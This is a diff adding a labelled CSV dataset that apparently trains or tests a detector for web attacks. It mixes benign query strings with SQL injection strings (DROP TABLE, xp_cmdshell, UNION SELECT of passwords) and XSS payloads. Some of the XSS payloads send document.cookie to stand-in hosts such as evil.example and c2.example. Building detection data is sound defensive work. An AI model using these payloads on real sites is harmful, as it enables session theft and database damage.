@@ -1,0 +1,514 @@
+payload,label
+<img src=x onerror=alert(1)>,xss
+sort=asc&ref=book,benign
+<style>@import 'http://evil.example/xss.css';</style>,xss
+user_id=2057,benign
+1' AND 1=1 --,sqli
+<script>alert('xss')</script>,xss
+<img src=x onerror=this.src='http://evil.example/'+document.cookie>,xss
+currency=usd&lang=en&city=report,benign
+category=delta&session=27f1637,benign
+' OR '1'='1,sqli
+<video><source onerror=alert(1)></video>,xss
+theme=dark&limit=379&currency=usd,benign
+lang=id&price_min=2194,benign
+lang=en&currency=usd&ref=book,benign
+name=settings&token=3bdf2a8,benign
+<input onfocus=alert(1) autofocus>,xss
+category=camera,benign
+price_max=8067&lang=en,benign
+search=dashboard&tab=foxtrot,benign
+' OR SLEEP(5)='0,sqli
+limit=6276,benign
+category=profile&size=m,benign
+1' AND 1=1 --,sqli
+admin' --,sqli
+q=camera&price_min=3864&size=m,benign
+') OR ('1'='1,sqli
+<script>new Image().src='http://c2.example/?c='+document.cookie;</script>,xss
+user_id=8038&city=settings,benign
+theme=dark&coupon=dashboard,benign
+color=foxtrot&email=jakarta@example.com,benign
+view=grid&format=json&tab=foxtrot,benign
+search=foxtrot&theme=dark,benign
+""" UNION SELECT table_name FROM information_schema.tables --",sqli
+<svg onload=alert(1)>,xss
+1' AND SLEEP(7) --,sqli
+1' AND 1=1 --,sqli
+category=settings,benign
+price_min=9395&session=1847684,benign
+"' UNION SELECT username, password FROM users --",sqli
+<svg onload=alert(1)>,xss
+tab=invoice&color=invoice,benign
+price_min=5978,benign
+price_min=5254&price_max=2348,benign
+<details open ontoggle=alert(1)>,xss
+"' UNION SELECT NULL, NULL, NULL --",sqli
+"<a href=""javascript:alert(1)"">click</a>",xss
+""" UNION SELECT table_name FROM information_schema.tables --",sqli
+color=foxtrot,benign
+user_id=169,benign
+<body onload=alert('xss')>,xss
+'; DROP TABLE users; --,sqli
+email=phone@example.com&page=9985&currency=usd,benign
+coupon=delta,benign
+<iframe src=javascript:alert(1)>,xss
+tab=camera&price_min=2833&size=m,benign
+qty=5543,benign
+q=jakarta&coupon=jakarta&limit=6746,benign
+coupon=report,benign
+redirect=/home&qty=8043&color=phone,benign
+category=dashboard,benign
+user_id=999&offset=2870,benign
+' OR '1'='1,sqli
+'><script>alert(1)</script>,xss
+tab=dashboard&size=m,benign
+<script>alert(document.cookie)</script>,xss
+session=3e68086,benign
+<svg onload=alert(1)>,xss
+"""><script>alert(1)</script>",xss
+' OR EXISTS(SELECT * FROM users) --,sqli
+<script>eval(atob('YWxlcnQoMSk='))</script>,xss
+qty=4531&view=grid,benign
+sort=desc&theme=dark&color=alice,benign
+page=268&user_id=4946&price_max=3636,benign
+ref=dashboard&name=phone&qty=5119,benign
+1 OR 1=1,sqli
+<script>alert(document.cookie)</script>,xss
+' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
+session=3691889&callback=profile,benign
+' OR '1'='1,sqli
+<input onfocus=alert(1) autofocus>,xss
+' OR 1=1 --,sqli
+' OR '1'='1,sqli
+<div onmouseover=alert(1)>hover</div>,xss
+page=9823,benign
+sort=asc&id=9728,benign
+page=2522&lang=id&color=delta,benign
+sort=desc&offset=2206,benign
+' OR SLEEP(6)='0,sqli
+name=orders&sort=desc,benign
+""" UNION SELECT table_name FROM information_schema.tables --",sqli
+<iframe src=javascript:alert(1)>,xss
+<script>alert('xss')</script>,xss
+' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
+page=6437,benign
+price_max=8971&ref=invoice&city=citra,benign
+<video><source onerror=alert(1)></video>,xss
+<script>document.location='http://evil.example/'+document.cookie</script>,xss
+' GROUP BY password HAVING 1=1 --,sqli
+<marquee onstart=alert(1)>,xss
+callback=invoice,benign
+admin' --,sqli
+lang=en&callback=delta,benign
+theme=dark&price_min=1103&sort=desc,benign
+<script>alert('xss')</script>,xss
+"' UNION SELECT NULL, NULL, NULL --",sqli
+page=9373&price_min=3644&format=json,benign
+' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
+1; EXEC xp_cmdshell('dir') --,sqli
+color=shoes&city=shoes&view=grid,benign
+<script>new Image().src='http://bad-host.example/?c='+document.cookie;</script>,xss
+redirect=/home&lang=en&q=jakarta,benign
+lang=en,benign
+city=budi&redirect=/home,benign
+<script>alert(document.cookie)</script>,xss
+id=6671&offset=9153&search=orders,benign
+<script>new Image().src='http://c2.example/?c='+document.cookie;</script>,xss
+session=3208a8c&price_min=2955,benign
+<marquee onstart=alert(1)>,xss
+city=echo&coupon=phone,benign
+session=4449da7&currency=usd,benign
+email=orders@example.com&token=3268c40,benign
+' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
+id=2823,benign
+token=57ca662&search=phone&price_max=7998,benign
+<script>eval(atob('YWxlcnQoMSk='))</script>,xss
+1' AND 1=1 --,sqli
+size=m&offset=3081&user_id=2239,benign
+' HAVING 1=1 --,sqli
+ref=delta,benign
+user_id=558&offset=1507&category=foxtrot,benign
+qty=7553,benign
+ref=citra&price_max=9065,benign
+1; EXEC xp_cmdshell('dir') --,sqli
+""" UNION SELECT table_name FROM information_schema.tables --",sqli
+' OR '1'='1,sqli
+city=report&view=grid,benign
+admin' --,sqli
+sort=asc&size=m,benign
+format=json&limit=5027,benign
+<style>@import 'http://evil.example/xss.css';</style>,xss
+offset=3372,benign
+""" UNION SELECT table_name FROM information_schema.tables --",sqli
+<script>new Image().src='http://evil.example/?c='+document.cookie;</script>,xss
+size=m&theme=dark,benign
+' HAVING 1=1 --,sqli
+<img src=x onerror=this.src='http://evil.example/'+document.cookie>,xss
+<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
+lang=en&sort=desc&redirect=/home,benign
+city=settings,benign
+' OR '1'='1,sqli
+<marquee onstart=alert(1)>,xss
+<marquee onstart=alert(1)>,xss
+tab=surakarta&redirect=/home&email=budget@example.com,benign
+') OR ('1'='1,sqli
+tab=shoes&limit=7787,benign
+limit=9799,benign
+<video><source onerror=alert(1)></video>,xss
+qty=2000&format=json&lang=id,benign
+user_id=622&search=foxtrot&email=citra@example.com,benign
+limit=2718&theme=dark&qty=9280,benign
+<svg onload=alert(1)>,xss
+sort=desc&view=grid&q=orders,benign
+<iframe src=javascript:alert(1)>,xss
+sort=desc&view=grid&lang=id,benign
+redirect=/home&color=echo,benign
+' OR 2=7 --,sqli
+' OR 'a'='a,sqli
+<script>document.location='http://attacker.test/'+document.cookie</script>,xss
+admin' --,sqli
+user_id=7439&format=json&theme=dark,benign
+callback=citra,benign
+admin' --,sqli
+sort=desc&price_min=5655,benign
+ref=citra&token=4754d96,benign
+color=budget&category=laptop&price_min=8822,benign
+'; DROP TABLE users; --,sqli
+<script>new Image().src='http://attacker.test/?c='+document.cookie;</script>,xss
+<script>new Image().src='http://evil.example/?c='+document.cookie;</script>,xss
+qty=4067&user_id=6819&sort=asc,benign
+user_id=9330,benign
+admin' --,sqli
+price_min=7224&q=surakarta,benign
+user_id=6825,benign
+q=settings,benign
+1' AND SLEEP(5) --,sqli
+price_min=9791,benign
+"' UNION SELECT NULL, NULL, NULL --",sqli
+"' UNION SELECT NULL, NULL, NULL --",sqli
+' GROUP BY password HAVING 5=9 --,sqli
+<script>eval(atob('YWxlcnQoMSk='))</script>,xss
+qty=5734,benign
+theme=dark&size=m,benign
+<body onload=alert('xss')>,xss
+id=2469&limit=3559&sort=asc,benign
+<details open ontoggle=alert(1)>,xss
+<body onload=alert('xss')>,xss
+tab=report&name=shoes&color=shoes,benign
+lang=en&city=orders,benign
+token=2ed1640&format=json,benign
+city=budi&session=beba3a,benign
+price_max=8334&sort=asc&search=alice,benign
+q=citra&qty=1660,benign
+search=budi,benign
+<svg onload=alert(1)>,xss
+callback=dashboard&size=m,benign
+email=settings@example.com&id=6866,benign
+format=json&token=3573626&lang=en,benign
+format=json&coupon=book,benign
+' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
+sort=desc&format=json&page=1670,benign
+format=json&color=citra,benign
+page=3269,benign
+1' AND 2=2 --,sqli
+category=orders&ref=jakarta&price_min=4307,benign
+<style>@import 'http://evil.example/xss.css';</style>,xss
+<img src=x onerror=alert(1)>,xss
+<script>eval(atob('YWxlcnQoMSk='))</script>,xss
+qty=3044&ref=book&session=12f212c,benign
+' GROUP BY password HAVING 1=1 --,sqli
+""" UNION SELECT table_name FROM information_schema.tables --",sqli
+<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
+qty=603&lang=id,benign
+""" OR ""1""=""1",sqli
+1 OR 1=1,sqli
+user_id=6132&search=alice&sort=desc,benign
+email=phone@example.com,benign
+<marquee onstart=alert(1)>,xss
+lang=en&price_max=2911,benign
+' OR 'a'='a,sqli
+' OR EXISTS(SELECT * FROM users) --,sqli
+session=3aa6d07&price_max=6932,benign
+<svg onload=alert(1)>,xss
+1' AND 1=1 --,sqli
+'><script>alert(1)</script>,xss
+callback=foxtrot&token=4d85b7b,benign
+<img src=x onerror=alert(1)>,xss
+<script>eval(atob('YWxlcnQoMSk='))</script>,xss
+email=surakarta@example.com&page=8420,benign
+offset=6956&tab=jakarta&sort=asc,benign
+1' AND SLEEP(5) --,sqli
+format=json&sort=desc&currency=usd,benign
+size=m&page=9618&search=settings,benign
+<svg onload=alert(1)>,xss
+id=3316,benign
+size=m&sort=desc,benign
+color=delta&callback=foxtrot,benign
+coupon=book&callback=report,benign
+<input onfocus=alert(1) autofocus>,xss
+q=surakarta,benign
+redirect=/home&sort=asc,benign
+"""><script>alert(1)</script>",xss
+<input onfocus=alert(1) autofocus>,xss
+') OR ('1'='1,sqli
+token=1aeefb9,benign
+admin' --,sqli
+<style>@import 'http://evil.example/xss.css';</style>,xss
+' OR SLEEP(9)='0,sqli
+1; EXEC xp_cmdshell('dir') --,sqli
+token=1d0b159&lang=en,benign
+format=json,benign
+"' UNION SELECT username, password FROM users --",sqli
+1' AND 1=1 --,sqli
+search=book&offset=7430&user_id=5299,benign
+category=budget&email=echo@example.com&lang=id,benign
+city=invoice,benign
+' GROUP BY password HAVING 1=1 --,sqli
+' HAVING 1=1 --,sqli
+lang=en&session=3075331&lang=id,benign
+redirect=/home&limit=6930&lang=en,benign
+name=dashboard&theme=dark,benign
+' OR 1=1#,sqli
+' OR '1'='1,sqli
+limit=4061&search=shoes&sort=desc,benign
+redirect=/home&offset=302&city=shoes,benign
+name=profile&offset=1295&view=grid,benign
+callback=profile,benign
+sort=asc&tab=alice,benign
+<img src=x onerror=alert(1)>,xss
+size=m&format=json,benign
+""" UNION SELECT table_name FROM information_schema.tables --",sqli
+user_id=6392,benign
+search=dashboard&city=report&lang=en,benign
+<script>fetch('http://bad-host.example/steal?c='+document.cookie)</script>,xss
+color=orders,benign
+q=echo&qty=2807,benign
+sort=asc&price_min=3240&offset=1507,benign
+<script>document.location='http://attacker.test/'+document.cookie</script>,xss
+size=m&category=settings,benign
+"""><script>alert(1)</script>",xss
+' OR SLEEP(6)='0,sqli
+view=grid&id=9503&user_id=5280,benign
+ref=budget&qty=1735&session=3d02b68,benign
+limit=4730&city=budi,benign
+<input onfocus=alert(1) autofocus>,xss
+city=surakarta,benign
+'; DROP TABLE users; --,sqli
+session=14677d1&format=json&currency=usd,benign
+format=json&page=1443&price_max=6862,benign
+sort=desc&name=budget&category=profile,benign
+<script>document.location='http://c2.example/'+document.cookie</script>,xss
+<iframe src=javascript:alert(1)>,xss
+callback=laptop&token=5b871e8&limit=7743,benign
+'; DROP TABLE users; --,sqli
+size=m&color=camera,benign
+ref=laptop,benign
+' OR SLEEP(5)='0,sqli
+price_min=1770&category=book,benign
+<body onload=alert('xss')>,xss
+session=256cc62&lang=en,benign
+format=json&price_min=6036,benign
+callback=foxtrot&token=248db1d&redirect=/home,benign
+view=grid&color=jakarta,benign
+<video><source onerror=alert(1)></video>,xss
+id=9078&lang=id,benign
+<input onfocus=alert(1) autofocus>,xss
+user_id=9469&ref=orders&price_max=9344,benign
+<body onload=alert('xss')>,xss
+<script>alert(document.cookie)</script>,xss
+<svg onload=alert(1)>,xss
+') OR ('1'='1,sqli
+<marquee onstart=alert(1)>,xss
+"""><script>alert(1)</script>",xss
+<input onfocus=alert(1) autofocus>,xss
+"' UNION SELECT NULL, NULL, NULL --",sqli
+<video><source onerror=alert(1)></video>,xss
+<div onmouseover=alert(1)>hover</div>,xss
+tab=foxtrot,benign
+user_id=4920,benign
+sort=asc&callback=foxtrot&coupon=delta,benign
+admin' --,sqli
+tab=surakarta&currency=usd,benign
+theme=dark&email=laptop@example.com,benign
+tab=settings&email=settings@example.com,benign
+price_max=9273&tab=dashboard&sort=desc,benign
+color=alice&name=budi&sort=asc,benign
+tab=shoes&user_id=7416&category=budget,benign
+""" UNION SELECT table_name FROM information_schema.tables --",sqli
+<input onfocus=alert(1) autofocus>,xss
+id=3507&callback=echo&sort=desc,benign
+' OR EXISTS(SELECT * FROM users) --,sqli
+callback=orders,benign
+token=ac6435&city=book&format=json,benign
+1' AND SLEEP(5) --,sqli
+email=delta@example.com,benign
+tab=orders&session=5e59e27,benign
+view=grid&id=6069&currency=usd,benign
+<script>document.location='http://bad-host.example/'+document.cookie</script>,xss
+currency=usd&redirect=/home,benign
+' HAVING 1=1 --,sqli
+category=citra&lang=en&price_max=5627,benign
+<video><source onerror=alert(1)></video>,xss
+"' UNION SELECT NULL, NULL, NULL --",sqli
+' OR 1=1 --,sqli
+<video><source onerror=alert(1)></video>,xss
+<video><source onerror=alert(1)></video>,xss
+category=invoice&limit=1771,benign
+<script>alert('xss')</script>,xss
+q=laptop&page=1436,benign
+limit=3156&sort=desc,benign
+<input onfocus=alert(1) autofocus>,xss
+session=5556b82&ref=report&id=3520,benign
+q=camera&sort=asc&view=grid,benign
+<body onload=alert('xss')>,xss
+"' UNION SELECT NULL, NULL, NULL --",sqli
+lang=id&search=citra&id=1393,benign
+theme=dark&size=m&q=alice,benign
+city=camera&qty=9089,benign
+<style>@import 'http://evil.example/xss.css';</style>,xss
+lang=en&sort=desc,benign
+<iframe src=javascript:alert(1)>,xss
+size=m&qty=9325,benign
+search=shoes&coupon=echo&tab=citra,benign
+<svg onload=alert(1)>,xss
+admin' --,sqli
+' OR 1=1#,sqli
+1; EXEC xp_cmdshell('dir') --,sqli
+<details open ontoggle=alert(1)>,xss
+token=2e8f884&page=2743&id=7901,benign
+user_id=8667&price_max=9087&tab=phone,benign
+city=settings&coupon=book&lang=id,benign
+' OR 1=1 --,sqli
+page=6245&lang=id,benign
+' OR 1=1 --,sqli
+city=laptop&name=delta&session=331056d,benign
+price_min=4273&name=budget&lang=en,benign
+""" UNION SELECT table_name FROM information_schema.tables --",sqli
+' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
+price_max=8085,benign
+callback=foxtrot,benign
+token=4432819&lang=en,benign
+<script>alert('xss')</script>,xss
+price_max=481&limit=7729,benign
+' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
+""" OR ""1""=""1",sqli
+<script>alert('xss')</script>,xss
+<script>eval(atob('YWxlcnQoMSk='))</script>,xss
+' OR 1=1#,sqli
+"""><script>alert(1)</script>",xss
+"' UNION SELECT NULL, NULL, NULL --",sqli
+<iframe src=javascript:alert(1)>,xss
+offset=5203,benign
+<details open ontoggle=alert(1)>,xss
+theme=dark&color=orders,benign
+<script>new Image().src='http://attacker.test/?c='+document.cookie;</script>,xss
+sort=desc&token=48be168,benign
+q=echo,benign
+session=203f2d2&view=grid&q=delta,benign
+color=dashboard&user_id=1495,benign
+<img src=x onerror=this.src='http://evil.example/'+document.cookie>,xss
+limit=7556,benign
+size=m&lang=id&search=laptop,benign
+page=6451&name=citra&lang=id,benign
+session=55d71c6,benign
+<script>fetch('http://c2.example/steal?c='+document.cookie)</script>,xss
+page=8973,benign
+user_id=1531&price_max=2763&city=jakarta,benign
+price_min=8314,benign
+price_max=3258&id=3612&city=laptop,benign
+1 OR 1=1,sqli
+' OR SLEEP(8)='0,sqli
+email=orders@example.com&coupon=laptop&category=echo,benign
+<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
+<svg onload=alert(1)>,xss
+view=grid&city=surakarta&theme=dark,benign
+"<a href=""javascript:alert(1)"">click</a>",xss
+format=json&price_max=5665&sort=desc,benign
+city=foxtrot&color=camera,benign
+<img src=x onerror=alert(1)>,xss
+q=delta,benign
+<script>new Image().src='http://evil.example/?c='+document.cookie;</script>,xss
+city=shoes&limit=526&size=m,benign
+<svg onload=alert(1)>,xss
+' OR 1=1 --,sqli
+<img src=x onerror=this.src='http://evil.example/'+document.cookie>,xss
+page=2882&coupon=citra&city=budget,benign
+'><script>alert(1)</script>,xss
+""" UNION SELECT table_name FROM information_schema.tables --",sqli
+session=558d929&lang=id&category=foxtrot,benign
+<script>alert(document.cookie)</script>,xss
+<script>alert(document.cookie)</script>,xss
+1 OR 1=1,sqli
+session=520f8e5,benign
+session=1def43e&color=phone&currency=usd,benign
+1; EXEC xp_cmdshell('dir') --,sqli
+email=foxtrot@example.com,benign
+limit=9425,benign
+session=1de42ed&limit=7904&price_max=5583,benign
+' OR 'a'='a,sqli
+price_min=437&user_id=4351,benign
+<style>@import 'http://evil.example/xss.css';</style>,xss
+session=3521f30,benign
+') OR ('1'='1,sqli
+session=391974f&sort=asc,benign
+session=4ef7eb7&redirect=/home,benign
+user_id=1261,benign
+q=orders&sort=desc,benign
+<details open ontoggle=alert(1)>,xss
+qty=2763&session=5b90675,benign
+id=576,benign
+<img src=x onerror=alert(1)>,xss
+admin' --,sqli
+' OR SLEEP(7)='0,sqli
+' OR '1'='1,sqli
+color=foxtrot&view=grid&format=json,benign
+city=budi&id=150,benign
+<marquee onstart=alert(1)>,xss
+offset=4912&session=2919ab6,benign
+sort=asc&price_min=6358&view=grid,benign
+limit=9336&ref=orders,benign
+sort=desc&search=settings&color=budi,benign
+"' UNION SELECT username, password FROM users --",sqli
+category=phone,benign
+<script>alert('xss')</script>,xss
+' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
+<input onfocus=alert(1) autofocus>,xss
+lang=en&coupon=settings&price_max=6690,benign
+price_max=7106,benign
+email=budi@example.com&session=d7ca65&format=json,benign
+qty=8815,benign
+<input onfocus=alert(1) autofocus>,xss
+' OR SLEEP(10)='0,sqli
+page=4263,benign
+<script>alert('xss')</script>,xss
+<iframe src=javascript:alert(1)>,xss
+<img src=x onerror=this.src='http://bad-host.example/'+document.cookie>,xss
+currency=usd&price_min=945&id=7479,benign
+size=m&lang=id,benign
+ref=profile&email=report@example.com&q=book,benign
+"' UNION SELECT username, password FROM users --",sqli
+category=alice&id=6542,benign
+id=528&price_min=5411&tab=foxtrot,benign
+'; DROP TABLE users; --,sqli
+session=59b3e8e&tab=profile,benign
+qty=8729&token=4c6322d&offset=3288,benign
+theme=dark&format=json,benign
+' OR 1=1 --,sqli
+' OR 'a'='a,sqli
+""" OR ""1""=""1",sqli
+view=grid,benign
+token=1db6259&offset=4985,benign
+' OR '1'='1,sqli
+offset=5310,benign
+'; DROP TABLE users; --,sqli
+"<a href=""javascript:alert(1)"">click</a>",xss
+page=1466&coupon=shoes&redirect=/home,benign
+' OR SLEEP(5)='0,sqli
+1' AND SLEEP(3) --,sqli
+<video><source onerror=alert(1)></video>,xss
+' OR 'a'='a,sqli
+format=json&lang=en,benign
+1' AND 1=1 --,sqli
+<iframe src=javascript:alert(1)>,xss
+limit=1220&format=json&session=d1abd9,benign
